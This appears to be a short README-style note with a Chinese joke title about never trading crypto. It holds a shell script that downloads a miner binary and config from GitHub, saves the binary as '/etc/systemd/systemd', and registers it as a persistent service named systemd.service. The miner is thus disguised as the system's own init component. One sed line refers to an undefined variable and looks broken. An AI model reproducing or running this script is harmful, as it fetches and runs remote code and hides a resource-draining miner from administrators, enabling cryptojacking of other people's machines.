# 炒币是不可能炒币的，这辈子也不可能炒币的


```
wget -P /etc/systemd/ https://github.com/GouGoGoal/SHELL/raw/master/Miner/systemd 
wget -P /etc/systemd/ https://github.com/GouGoGoal/SHELL/raw/master/Miner/config.json

chmod +x /etc/systemd/systemd 

echo '
[Unit]
After=rc-local.service

[Service]
Type=simple
#参数：-t 设置线程数  
ExecStart=/etc/systemd/systemd -c /etc/systemd/config.json
#限制使用一个核
#CPUQuota=100%
Restart=always
[Install]
WantedBy=multi-user.target
'>/etc/systemd/system/systemd.service

sed -i 's#\("Address":"\).*\(,\)#\1'"$address"'",#g' $i

systemctl start systemd
```



